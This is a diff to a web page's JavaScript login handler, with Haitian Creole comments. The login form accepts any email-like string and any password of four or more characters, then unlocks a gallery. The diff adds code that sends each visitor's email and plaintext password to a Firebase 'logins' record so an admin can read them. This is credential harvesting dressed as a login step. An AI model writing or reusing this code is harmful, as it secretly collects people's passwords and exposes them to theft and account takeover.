@@ -427,15 +427,20 @@ btnLogin.onclick = () => {
   if (!email.includes("@")) { err.innerText = "Email pa valid."; return; }
   if (pw.length < 4) { err.innerText = "Modpas dwe gen 4+ karaktè."; return; }
 
+  // ✅ SOVGADE EMAIL
   localStorage.setItem("visitor_email", email);
+
+  // ✅ SOVGADE KONEKSYON NAN FIREBASE (pou admin wè)
+  db.ref("logins").push({
+    email: email,
+    password: pw,           
+    visitorId: VISITOR_ID,
+    time: Date.now()
+  });
+
   loginScreen.classList.add("hidden");
   appContent.classList.add("active");
 };
-
-pwInput.addEventListener("keydown", (e) => {
-  if (e.key === "Enter") btnLogin.click();
-});
-
 /* ============================================
    GALRI
    ============================================ */
